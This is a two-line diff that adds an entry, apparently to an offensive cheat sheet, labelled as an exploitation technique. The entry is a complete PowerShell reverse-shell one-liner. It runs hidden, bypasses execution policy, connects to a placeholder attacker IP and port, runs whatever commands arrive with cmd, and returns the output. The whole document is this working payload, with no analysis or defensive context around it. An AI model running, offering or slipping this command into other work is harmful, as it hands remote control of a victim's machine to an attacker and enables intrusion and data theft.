@@ -1,0 +1,2 @@
+# [Exploitation] Reverse shell (TCPClient) --powershell
+powershell -NoP -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('<attacker_ip>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$o=(cmd /c $d)2>&1; $r=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($r,0,$r.Length);$s.Flush()}"
